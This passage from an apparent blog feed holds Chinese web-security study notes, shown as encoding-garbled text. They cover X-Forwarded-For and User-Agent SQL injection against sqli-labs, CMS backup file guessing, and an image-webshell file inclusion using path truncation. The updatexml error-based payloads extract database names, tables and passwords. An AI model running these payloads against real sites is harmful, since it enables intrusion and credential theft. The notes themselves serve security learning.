‡å‡†ï¼Œå¾ˆå¤šæœåŠ¡å™¨å®Œå…¨æ²¡æ³•è·å–</p><p>ç¬¬äºŒä¸ªX-Forwarded-Foræ˜¯ä¸ªæ‰©å±•è¯·æ±‚å¤´ï¼Œè¿™ä¸ªä¸œè¥¿å¯ä»¥é€šè¿‡HTTPè¯·æ±‚å¤´æ¥ä¿®æ”¹ã€‚<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194mh7qkj31cy0oudle.jpg" alt><br>é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä¿®æ”¹X-Forwarder-Forçš„å‚æ•°ï¼Œå°†å‚æ•°æ’å…¥åˆ°ipä¸­ï¼Œé‚£ä¹ˆipçš„å€¼å°±ä¼šæ”¾å…¥sqlè¯­å¥ä¸­æ‰§è¡Œå‘¢?<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194usqr2j31h90nxtas.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41953pdecj30zh0kydhq.jpg" alt><br>æˆ‘ä»¬ç»™ä¸ªåˆ†å·æµ‹è¯•ä¸€ä¸‹<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195bynenj31ga0nltar.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195kp9p5j31hc0fdt8t.jpg" alt><br>å‘ç°æˆåŠŸæŠ¥é”™<br>å› ä¸ºX-Forwarded-Foræ˜¯ç›´æ¥è·å–çš„ï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°é­”æœ¯å¼•å·ã€‚<br>è¿™é‡Œæˆ‘ä»¬ç›´æ¥ç”¨sqlmap å°±èƒ½ç›´æ¥è·‘å‡ºæ¥äº†<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195ssd3yj30xz0hrq4w.jpg" alt></p><h3 id="æ•°æ®åº“å¤‡ä»½æ–‡ä»¶æ³„éœ²"><a href="#æ•°æ®åº“å¤‡ä»½æ–‡ä»¶æ³„éœ²" class="headerlink" title="æ•°æ®åº“å¤‡ä»½æ–‡ä»¶æ³„éœ²"></a>æ•°æ®åº“å¤‡ä»½æ–‡ä»¶æ³„éœ²</h3><p>æœ‰æ—¶å€™ï¼Œç®¡ç†å‘˜åœ¨å¤‡ä»½æ•°æ®åº“çš„æ—¶å€™ï¼Œç›´æ¥é»˜è®¤å°†å¤‡ä»½æ–‡ä»¶ç›´æ¥æ”¾åœ¨ç½‘ç«™ç›®å½•ä¸‹ï¼Œè¿™æ ·å…¶å®æ˜¯å¾ˆå±é™©çš„ï¼Œå¾ˆå®¹æ˜“è¢«é»‘å®¢æ‘¸å‡ºæ¥ã€‚<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41964opglj31hc0omjv5.jpg" alt><br>æˆ‘ä»¬ç™»å…¥åå°ï¼Œå‘ç°äº†ä¸€ä¸ªæ•°æ®åº“å¤‡ä»½ï¼Œå¥½ï¼Œé‚£æˆ‘ä»¬å°†æ•°æ®åº“å¤‡ä»½<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196cvcatj31hc0bsdgs.jpg" alt><br>æˆ‘ä»¬åˆ°ç½‘ç«™ç›®å½•çœ‹ä¸€ä¸‹<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196lq5n3j30st05pt8r.jpg" alt><br>å‘ç°ä»–çš„å‘½åè§„åˆ™æ˜¯å¤‡ä»½çš„å¹´æœˆæ—¥ï¼Œé‚£å¦‚æœæˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªCMSï¼ŒçŸ¥é“ä»–çš„å¤‡ä»½ç›®å½•ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥å°è¯•ç€çˆ†ç ´ä¸€ä¸‹å¤‡ä»½æ–‡ä»¶<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196v5eboj31gt0q4wft.jpg" alt></p><h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><p>æ–‡ä»¶åŒ…å«ï¼Œé¦–å…ˆéœ€è¦æ‰¾åˆ°åŒ…å«å‡½æ•°<br>æˆ‘ä»¬åœ¨æ‰¾åˆ°äº†ä¸€ä¸ªè²Œä¼¼å¯ä»¥æ§åˆ¶çš„includeå‡½æ•°ï¼Œä¸è¿‡éœ€è¦actå‚æ•°=payçš„æ—¶å€™æ‰èƒ½æ‰§è¡Œ<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g419766cocj31e10osn4c.jpg" alt><br>æœ€ååœ¨è´­ä¹°å……å€¼å¡é‚£æ‰¾åˆ°<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197f34tlj31hc0m241t.jpg" alt><br>æˆ‘ä»¬å…ˆæ‰¾åˆ°ä¸€ä¸ªèƒ½ä¸Šä¼ å›¾ç‰‡é©¬çš„ä¸Šä¼ ç‚¹<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197mhek1j31h90jqtac.jpg" alt><br>æˆåŠŸä¸Šä¼ <br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197vln3uj31h80k40t7.jpg" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &apos;include/payment/&apos;.$_POST[&apos;pay&apos;].&quot;/index.php&quot;;</span><br></pre></td></tr></table></figure></p><p>æ–‡ä»¶åŒ…å«çš„è·¯å¾„</p><p>é‚£ä¹ˆæˆ‘ä»¬å°†æœ¨é©¬è·¯å¾„ä¼ å…¥åˆ°postå‚æ•°ä¸­ï¼Œé‚£ä¹ˆè·¯å¾„ä¸ºï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay=../../data/upload/face_pic/15605135978.jpg</span><br></pre></td></tr></table></figure></p><p>è¿™æ ·çš„è¯ï¼ŒåŒ…å«è¯­å¥å°±ä¼šå˜æˆï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &apos;include/payment/../../data/upload/face_pic/15605135978.jpg/index.php&quot;;</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯è¿™æ ·çš„è¯ï¼Œåé¢è¿˜æœ‰ä¸ªindexã€‚phpï¼Œä»–ä¼šå»åŠ è½½index.php,ä¼šå¯¹åŠ è½½å›¾ç‰‡é©¬æœ‰æ‰€å½±å“ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å°†index.phpæˆªå–æ‰ï¼Œè¿™é‡Œ00æˆªæ–­è¯•è¿‡äº†ï¼Œphpä½ç‰ˆæœ¬æ‰ä¼šå­˜åœ¨è¿™æ ·çš„æˆªæ–­ã€‚</p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸ªå­—ç¬¦ä¸²æˆªæ–­çš„æ–¹æ³•ï¼ˆWindowsçš„è·¯å¾„ä¸èƒ½è¶…è¿‡60ä¸ªå­—ç¬¦ï¼‰åœ¨Windows APIä¸­ï¼Œè·¯å¾„çš„æœ€å¤§é•¿åº¦ä¸ºMAX_PATHï¼ŒMAX_PATHè¢«å®šä¹‰ä¸º260ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥å°è¯•åœ¨ä¼ å‚çš„åé¢åŠ ç‚¹è¿›è¡Œæˆªæ–­ï¼Œå› ä¸ºç‚¹æœ€åä¼šè¢«windowsç»™å¤„ç†æ‰ï¼Œä½†æ˜¯å¡«å……äº†ç‚¹ä¹‹åï¼Œåªä¼šä¿ç•™åŒ…å«å‰é¢15605093967.pngï¼Œåœ¨ä¼ å‚åçš„index.phpå› ä¸ºè·¯å¾„è¶…è¿‡260ä¸ªå­—ç¬¦åçš„ä¸œè¥¿éƒ½ä¼šè¢«èˆå¼ƒï¼Œäºæ˜¯ä¹æˆ‘ä»¬ç›´æ¥ä¼ å‚ååŠ 260ä¸ªç‚¹å°±å¯ä»¥æˆªæ–­äº†ã€‚<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4198wnf3nj30z40ni0ue.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g419azj97kj30h10n73zx.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥--0dayå®¡è®¡æ¡ˆä¾‹(1)</title>
      <link href="/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(1)/"/>
      <url>/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(1)/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><p>è¿™æ¬¡æˆ‘ä»¬è®²çš„æ˜¯ä¸€ç¯‡é€‚åˆæ–°æ‰‹å­¦ä¹ çš„ä»£ç å®¡è®¡ï¼Œå› ä¸ºæ˜¯ç»™å°ç™½å­¦ä¹ çš„ä»£ç å®¡è®¡ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨é»‘ç›’+ç™½ç›’äº¤å‰å®¡è®¡çš„æƒ…å†µä¸‹ï¼Œæ›´å¥½çš„å¸®åŠ©å°ç™½å­¦ä¹ å¹¶æ‰¾å‡ºæ¼æ´ã€‚</p><h3 id="ç¯å¢ƒæ­å»ºï¼š"><a href="#ç¯å¢ƒæ­å»ºï¼š" class="headerlink" title="ç¯å¢ƒæ­å»ºï¼š"></a>ç¯å¢ƒæ­å»ºï¼š</h3><p>phpstudy<br>BlueCMS1.6 sp1æºç <br>ä»£ç å®¡è®¡å·¥å…·(Seayæºä»£ç å®¡è®¡ç³»ç»Ÿ)</p><h3 id="å®¡è®¡æ€è·¯ï¼š"><a href="#å®¡è®¡æ€è·¯ï¼š" class="headerlink" title="å®¡è®¡æ€è·¯ï¼š"></a>å®¡è®¡æ€è·¯ï¼š</h3><p>ä¸€èˆ¬æ¥è¯´ï¼Œæœ‰ä¸€å®šä»£ç åŠŸåŠ›çš„äººå®¡è®¡ä»£ç ,ä¼šç›´æ¥å°†å…¨æ–‡ä»£ç é€šè¯»ä¸€éï¼Œå¹¶å¯»æ‰¾ä¼ å‚è¿›è¡Œä»£ç å®¡è®¡ï¼Œä½†è¿™æ˜¯å¯¹æœ‰ä¸€å®šä»£ç åŠŸåŠ›çš„äººè€Œè¨€ã€‚</p><p>è€Œå¯¹å°ç™½è€Œè¨€ï¼Œåˆ©ç”¨é»‘ç›’å’Œç™½ç›’äº¤å‰å®¡è®¡çš„æƒ…å†µä¸‹ï¼Œæ›´èƒ½å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°æ¼æ´ã€‚</p><p>æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªCMSåï¼Œå¯ä»¥<strong>å…ˆå¯»æ‰¾åŠŸèƒ½ç‚¹</strong>ï¼Œç„¶åå°†åŠŸèƒ½ç‚¹ç½—åˆ—å‡ºæ¥ï¼Œå¹¶å¯¹å…¶åŠŸèƒ½ç‚¹è¿›è¡Œä¸æ–­æµ‹è¯•ï¼Œç„¶ååœ¨æ‹¿åˆ°ä»£ç çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥<strong>å¯¹åŠŸèƒ½ç‚¹æ‰€å¯¹åº”çš„ä¼ å‚è¿›è¡Œå®¡è®¡ï¼Œé‚£å¦‚æœçŸ¥é“äº†ä¼ å‚çš„æ„ä¹‰ï¼Œå°±ç­‰äºçŸ¥é“ä»£ç ä¼šå»åšä»€ä¹ˆï¼Œè¦å»åšä»€ä¹ˆäº†å‘¢</strong>ã€‚<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znruehwoj30za0rkjud.jpg" alt></p><h3 id="å¤§æ¦‚æµ‹è¯•æµç¨‹ï¼š"><a href="#å¤§æ¦‚æµ‹è¯•æµç¨‹ï¼š" class="headerlink" title="å¤§æ¦‚æµ‹è¯•æµç¨‹ï¼š"></a>å¤§æ¦‚æµ‹è¯•æµç¨‹ï¼š</h3><ul><li><strong>æ€»ç»“åŠŸèƒ½ç‚¹</strong></li><li><strong>é»‘ç›’æµ‹è¯•åŠŸèƒ½ç‚¹ï¼š</strong></li></ul><p>â‘ é»‘ç›’æµ‹è¯•æµ‹ä¸å‡ºæ¥çš„åœ°æ–¹è¿›è¡Œç™½ç›’å®¡è®¡</p><p>â‘¡æµ‹è¯•ç»“æœè¿›è¡Œç™½ç›’å®¡è®¡</p><h3 id="Seayæºç å®¡è®¡ç³»ç»Ÿ"><a href="#Seayæºç å®¡è®¡ç³»ç»Ÿ" class="headerlink" title="Seayæºç å®¡è®¡ç³»ç»Ÿ"></a>Seayæºç å®¡è®¡ç³»ç»Ÿ</h3><p>å¸¸è§åŠŸèƒ½ç®€ä»‹ï¼š<br>1.ä»£ç è‡ªåŠ¨é«˜äº®<br>2.å¯ä»¥è‡ªåŠ¨å®¡è®¡ï¼ˆè¯¯æŠ¥ç‡é«˜ï¼‰<br>3.å¯ä»¥å¿«é€Ÿå…¨å±€æœç´¢<br>4.å¯ä»¥å®šä½å‡½æ•°<br>5å¯ä»¥ç›‘æ§Mysql(æ’ä»¶)<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znttjhddj31fo0rpn5h.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znu53w7bj31hb0rk792.jpg" alt></p><hr><p>è¿™é‡Œæˆ‘ä»¬åªè®²äº†ä»£ç å®¡è®¡çš„ç»­ç¯‡ï¼Œä¸‹ä¸€ç¯‡æ–‡ç« æˆ‘ä»¬ä¼šå¼€å§‹è¿›è¡Œä»£ç å®¡è®¡ã€æ¼æ´æŒ–æ˜ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>headå¤´æ³¨å…¥</title>
      <link href="/2019/12/07/sql_head/"/>
      <url>/2019/12/07/sql_head/</url>
      
        <content type="html"><![CDATA[<p><strong>åœ¨è®²headæ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€äº›PHPçš„ä¸€äº›è¶…å…¨å±€å˜é‡ï¼Œåœ¨phpä¸­æœ‰å¾ˆå¤šé¢„å®šä¹‰çš„è¶…å…¨å±€å˜é‡ï¼Œè¿™å°±æ„å‘³ç€ä»–ä»¬åœ¨ä¸€ä¸ªè„šæœ¬çš„ä»»ä½•ä½œç”¨åŸŸéƒ½å¯ç”¨ï¼š</strong></p><p><strong>$_REQUEST:</strong>ï¼ˆè·å–getï¼Œpostï¼Œcookieçš„ä¼ å‚ï¼Œä½†åœ¨æ–°ç‰ˆæœ¬ä¸­å·²æ— æ³•è·å–cookieä¼ å‚äº†ï¼‰</p><p><strong>$_POST:</strong>ï¼ˆè·å–postä¼ å‚ï¼‰</p><p><strong>$_GET:</strong>(è·å–getçš„ä¼ å‚)</p><p><strong>$_COOKIE:</strong>(è·å–cookieçš„ä¼ å‚)</p><p><strong>$_SERVER</strong>(åŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header),è·¯å¾„(path)ç­‰ç”¨æˆ·ä¿¡æ¯)</p><h3 id="è½¬ä¹‰å‡½æ•°"><a href="#è½¬ä¹‰å‡½æ•°" class="headerlink" title="è½¬ä¹‰å‡½æ•°"></a>è½¬ä¹‰å‡½æ•°</h3><p><strong>addslashes()</strong> å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚</p><p>é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š</p><ul><li>å•å¼•å·ï¼ˆâ€™ï¼‰</li><li>åŒå¼•å·ï¼ˆâ€ï¼‰</li><li>åæ–œæ ï¼ˆ\ï¼‰</li><li>NULL</li></ul><p>æç¤ºï¼šè¯¥å‡½æ•°å¯ç”¨äºä¸ºå­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„å­—ç¬¦ä¸²ä»¥åŠæ•°æ®åº“æŸ¥è¯¢è¯­å¥å‡†å¤‡å­—ç¬¦ä¸²ã€‚</p><p>æ³¨é‡Šï¼šé»˜è®¤åœ°ï¼ŒPHP å¯¹æ‰€æœ‰çš„ GETã€POST å’Œ COOKIE æ•°æ®è‡ªåŠ¨è¿è¡Œ addslashes()ã€‚æ‰€ä»¥æ‚¨<br>ä¸åº”å¯¹å·²è½¬ä¹‰è¿‡çš„å­—ç¬¦ä¸²ä½¿ç”¨ addslashes()ï¼Œå› ä¸ºè¿™æ ·ä¼šå¯¼è‡´åŒå±‚è½¬ä¹‰ã€‚</p><p>é‡åˆ°è¿™ç§æƒ…å†µæ—¶å¯ä»¥ä½¿ç”¨å‡½æ•° get_magic_quotes_gpc() è¿›è¡Œæ£€æµ‹ã€‚</p><p>è¯­æ³•ï¼šaddslashes(string)</p><p>string å¿…éœ€ã€‚è§„å®šè¦è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚</p><p>è¿”å›å€¼ï¼š è¿”å›å·²è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚</p><p>PHP ç‰ˆæœ¬ï¼š 4+</p><ul><li>stripslashes()</li></ul><p>å‡½æ•°åˆ é™¤ç”± addslashes() å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚</p><p> <strong>mysql_real_escape_string()</strong></p><p>å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚<br>ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š</p><ul><li><p>\x00</p></li><li><p>\n</p></li><li><p>\r</p></li><li><p>\</p></li><li><p>â€˜</p></li><li><p>â€œ</p></li><li><p>\x1a</p></li></ul><p>å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›è¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚</p><p>è¯­æ³•ï¼šmysql_real_escape_string(string,connection)</p><p>string å¿…éœ€ã€‚è§„å®šè¦è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚</p><p>connection å¯é€‰ã€‚è§„å®š MySQL è¿æ¥ã€‚</p><p>å¦‚æœæœªè§„å®šï¼Œåˆ™ä½¿ç”¨ä¸Šä¸€ä¸ªè¿æ¥ã€‚</p><p>è¯´æ˜ï¼šæœ¬å‡½æ•°å°† string ä¸­çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œå¹¶è€ƒè™‘åˆ°è¿æ¥çš„å½“å‰å­—ç¬¦é›†ï¼Œå› æ­¤å¯ä»¥å®‰å…¨ç”¨<br>äº mysql_query()ã€‚</p><h2 id="åœ¨è¿™é‡Œæˆ‘ä»¬ç”¨sqli-é¶åœºless-18ä¸ºä¾‹ï¼Œ"><a href="#åœ¨è¿™é‡Œæˆ‘ä»¬ç”¨sqli-é¶åœºless-18ä¸ºä¾‹ï¼Œ" class="headerlink" title="åœ¨è¿™é‡Œæˆ‘ä»¬ç”¨sqli-é¶åœºless-18ä¸ºä¾‹ï¼Œ"></a>åœ¨è¿™é‡Œæˆ‘ä»¬ç”¨sqli-é¶åœºless-18ä¸ºä¾‹ï¼Œ</h2><p>åœ¨æ­¤å…³æºä»£ç ä¸­æˆ‘ä»¬çœ‹åˆ°ä»£ç ä¸­ç”¨check_inputå‡½æ•°ï¼Œå¯¹unameå’Œpasswdè¿›è¡Œè½¬ä¹‰ï¼Œæ‰€ä»¥ä¸èƒ½åœ¨å¯¹usernameå’Œpasswordæ¡†è¿›è¡Œæ³¨å…¥äº†<br><img src="http://m.qpic.cn/psb?/V10ZDHQP2itaxQ/nwswSpT55o1rDq4PQUE4HrdNkta0ob3ZmTFzPVC*JSg!/b/dL8AAAAAAAAA&amp;bo=6QFKAAAAAAADF5A!&amp;rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP2itaxQ/i*8eUgB0PmYpObHDUHxSCd*Tm5FLKf2TZEARLVerTFE!/b/dLkAAAAAAAAA&amp;bo=QQJVAAAAAAADFyQ!&amp;rf=viewer_4" alt><br>åœ¨å¾€ä¸‹ä»£ç æˆ‘ä»¬çœ‹åˆ°äº†æ’å…¥è¯­å¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;,</span><br><span class="line">&apos;$IP&apos;, $uname)&quot;;</span><br></pre></td></tr></table></figure></p><p>è¿™ç©¿ä»£ç å°†user-agentå’Œipæ’å…¥äº†æ•°æ®åº“ï¼Œè€Œæˆ‘ä»¬çš„æ§åˆ¶ç‚¹ä¹Ÿæ˜¯è¿™ä¸¤ä¸ªï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯èƒ½åˆ©ç”¨user-agentå’Œipè¿›è¡Œæ’å…¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŠ“åŒ…ä¿®æ”¹ä»–çš„user-agentè¿›è€Œæ¥è¿›è¡Œæ³¨å…¥</p><h4 id="æˆ‘ä»¬å…ˆæ¥è¯´ä¸€ä¸‹updatexml-å‡½æ•°"><a href="#æˆ‘ä»¬å…ˆæ¥è¯´ä¸€ä¸‹updatexml-å‡½æ•°" class="headerlink" title="æˆ‘ä»¬å…ˆæ¥è¯´ä¸€ä¸‹updatexml() å‡½æ•°"></a>æˆ‘ä»¬å…ˆæ¥è¯´ä¸€ä¸‹<strong>updatexml() å‡½æ•°</strong></h4><p><strong>è¯­æ³•ï¼šupdatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹)</strong></p><p>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)å®é™…ä¸Šè¿™é‡Œæ˜¯å»æ›´æ–°äº†XMLæ–‡æ¡£ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨XMLæ–‡æ¡£è·¯å¾„çš„ä½ç½®é‡Œé¢å†™å…¥äº†å­æŸ¥è¯¢ï¼Œæˆ‘ä»¬è¾“å…¥ç‰¹æ®Šå­—ç¬¦ï¼Œç„¶åå°±å› ä¸ºä¸ç¬¦åˆè¾“å…¥è§„åˆ™ç„¶åæŠ¥é”™äº†ä½†æ˜¯æŠ¥é”™çš„æ—¶å€™ä»–å…¶å®å·²ç»æ‰§è¡Œäº†é‚£ä¸ªå­æŸ¥è¯¢è¯­å¥ï¼</p><p>(0x7eå…¶å®ä»£è¡¨ç€16è¿›åˆ¶çš„â€~â€å·ï¼Œè½¬æ¢æˆ16è¿›åˆ¶å…¶å®æ˜¯ä¸ºäº†è¿‡ä¸€äº›è¿‡æ»¤ï¼Œä½¿å¾—ä»£ç â€å…¼å®¹æ€§â€æ›´é«˜ï¼Œ<strong>å…¶å®~æ˜¯ä¸ºäº†è®©è¯­æ³•æŠ¥é”™ï¼Œè®©æˆ‘ä»¬æ’å…¥çš„å­æŸ¥è¯¢æ‰§è¡Œå¹¶é€šè¿‡æŠ¥é”™å¸¦å‡ºæ¥</strong>ï¼Œå…¶å®åªè¦èƒ½è®©è¯­æ³•é”™è¯¯çš„æ ‡ç‚¹ç¬¦å·å…¶å®éƒ½æ˜¯å¯ä»¥çš„)</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨extractvalueï¼ˆï¼‰å‡½æ•°ï¼Œä½†ä½ç‰ˆæœ¬çš„mysqlå¥½åƒä¸æ”¯æŒè¿™ä¸ªå‡½æ•°ï¼›</p><h3 id="æˆ‘ä»¬é€šè¿‡modheardè¿™ä¸ªæ’ä»¶æ¥å¯¹user-agentè¿›è¡Œä¿®æ”¹"><a href="#æˆ‘ä»¬é€šè¿‡modheardè¿™ä¸ªæ’ä»¶æ¥å¯¹user-agentè¿›è¡Œä¿®æ”¹" class="headerlink" title="æˆ‘ä»¬é€šè¿‡modheardè¿™ä¸ªæ’ä»¶æ¥å¯¹user-agentè¿›è¡Œä¿®æ”¹"></a>æˆ‘ä»¬é€šè¿‡modheardè¿™ä¸ªæ’ä»¶æ¥å¯¹user-agentè¿›è¡Œä¿®æ”¹</h3><hr><p>æˆ‘ä»¬å…ˆä¿®æ”¹user-agentè¿›è¡Œæµ‹è¯•</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/q6bMPnwd5Da7o6uJLlJ1.yBautUyB39Idb5j8P42WaU!/b/dL8AAAAAAAAA&amp;bo=*QPdAAAAAAADBwE!&amp;rf=viewer_4" alt></p><p>å‘ç°æ’å…¥æˆåŠŸï¼</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±æ¥å¼€å§‹æ„é€ payloadè¿›è¡Œæ³¨å…¥ï¼š</p><ul><li>å…ˆæŸ¥è¯¢æ•°æ®åº“åï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select database())),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></li></ul><p>1â€™é—­åˆå‰é¢ï¼Œåé¢çš„ä¸¤å¯¹é—­åˆå•å¼•å·æ˜¯ä¸ºäº†è¡¥å……â€™$IPâ€™, $unameä¸¤ä¸ªæ•°æ®ä½ç½®ï¼›åœ¨å°†æ•°æ®åº“åé¢è¯­å¥æ³¨é‡Šæ‰</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/h5wItQlyqSf8q*fWEBZbyuxarCM9MsOS.gkgBK0AFo0!/b/dL4AAAAAAAAA&amp;bo=igSPAAAAAAADFzM!&amp;rf=viewer_4" alt></p><ul><li>æŸ¥è¯¢è¡¨å</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/6dP8GqUgFPrBrmBaR2CUU0UPLq4cOpZe1BXSsvGGRjs!/b/dFQBAAAAAAAA&amp;bo=PwZoAAAAAAADF2M!&amp;rf=viewer_4" alt></p><ul><li>æŸ¥è¯¢å­—æ®µå<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/1*jz.Je1g7Y*Ky6011XcNEhXaffD0Mr6HN4hV9JpoLg!/b/dFYBAAAAAAAA&amp;bo=VwZ1AAAAAAADFxY!&amp;rf=viewer_4" alt></p><ul><li>çˆ†ç”¨æˆ·å<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and  updatexml(1,concat(0x7e,(select group_concat(password) from users)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.UxMQ7MiXCRxXQl1xnmZtDYwcUwVV8wZTNeYe0QlnII!/b/dL8AAAAAAAAA&amp;bo=8wTCAAAAAAADFwc!&amp;rf=viewer_4" alt></p><p>çˆ†å¯†ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and  updatexml(1,concat(0x7e,(select group_concat(password) from users)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></p><p> <img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/pAockMgFEAkgsrRs7qt12dZT3QgONi0fXpuStLt3Ils!/b/dDcBAAAAAAAA&amp;bo=hQTRAAAAAAADF2I!&amp;rf=viewer_4" alt></p><p>è¿™æ ·ä¸€æ¬¡headå¤´çš„æ³¨å…¥å°±è¿™æ ·å®Œæˆäº†ï¼Œè€Œåé¢é¶åœºçš„headæ³¨å…¥å…¶å®ä¹Ÿæ˜¯å¯¹å…¶ä»–headå¤´ï¼ˆrefererã€cookieï¼‰è¿›è¡Œæ³¨å…¥è€Œå·²ï¼Œè€Œæ³¨å…¥çš„æ–¹æ³•å¤šç§å¤šæ ·â€¦â€¦</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å®½å­—èŠ‚æ³¨å…¥</title>
      <link href="/2019/12/07/sqlkzj/"/>
      <url>/2019/12/07/sqlkzj/</url>
      
